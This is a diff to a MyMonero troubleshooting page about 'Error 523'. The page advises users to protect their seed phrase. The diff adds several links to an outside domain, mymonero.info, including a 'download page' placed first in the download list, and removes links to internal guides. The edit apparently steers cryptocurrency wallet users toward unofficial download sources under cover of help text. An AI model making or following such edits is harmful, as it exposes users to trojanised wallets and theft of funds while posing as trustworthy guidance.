@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 Error 523 is general guidance that the server connection is unavailable. It does not, by itself, show that your wallet or funds are gone. Check your connection, try again later, and avoid entering your seed into a page or service that promises an instant repair.
 
+
+For a second walkthrough, see [MyMonero error codes on mymonero.info](https://mymonero.info/mymonero-error-codes). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).
+
 ## You'll see this if
 - A MyMonero screen displays “523” while loading or trying to connect.
 - A wallet-related page appears blank, times out, or cannot complete a request.
@@ -51,9 +54,9 @@ A wallet app also needs to scan blockchain history to show current information. 
 ## If that did not work
 Stop and preserve the state of the device and any seed backup. Do not send your seed to a person claiming to diagnose Error 523, and do not type it into a link received in chat, email, or a search advertisement. A legitimate helper does not need your seed. Be wary of “recovery” forms that ask for the words before explaining what wallet you are using.
 
-If you have your seed and intend to restore, first identify whether it has 13 MyMonero-specific legacy words or 25 standard Monero words. Do not guess missing words or transform one format into another. The [13-word seed restore guide](./mymonero-13-word-seed-restore.md) and [25-word seed migration guide](./mymonero-25-word-seed-migration.md) explain the distinction. A restore may require a block height from which to scan. Earlier is safer for finding older activity but takes longer; see [restore height explained](./mymonero-restore-height-explained.md).
+If you have your seed and intend to restore, first identify whether it has 13 MyMonero-specific legacy words or 25 standard Monero words. Do not guess missing words or transform one format into another. The [13-word seed restore guide](./mymonero-13-word-seed-restore.md) and 25-word seed migration guide explain the distinction. A restore may require a block height from which to scan. Earlier is safer for finding older activity but takes longer; see restore height explained.
 
-If you do not have a seed, avoid assuming that a hosted login failure can be fixed by resetting a password. The password-reset method and offline recovery of a missing seed word are not confirmed here. Keep any remaining records secure and do not disclose private keys or view keys while seeking general information. See [find your MyMonero seed](./find-mymonero-seed.md) for cautious backup-search steps.
+If you do not have a seed, avoid assuming that a hosted login failure can be fixed by resetting a password. The password-reset method and offline recovery of a missing seed word are not confirmed here. Keep any remaining records secure and do not disclose private keys or view keys while seeking general information. See find your MyMonero seed for cautious backup-search steps.
 
 > [!WARNING]
 > Never share your seed, private keys, or wallet backup with anyone offering to “clear” a 523 error. A seed gives access to wallet funds; treat it as secret even when a message looks official.
@@ -96,6 +99,7 @@ No. Nobody legitimate asks for your seed. Keep it private and use it only in a w
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
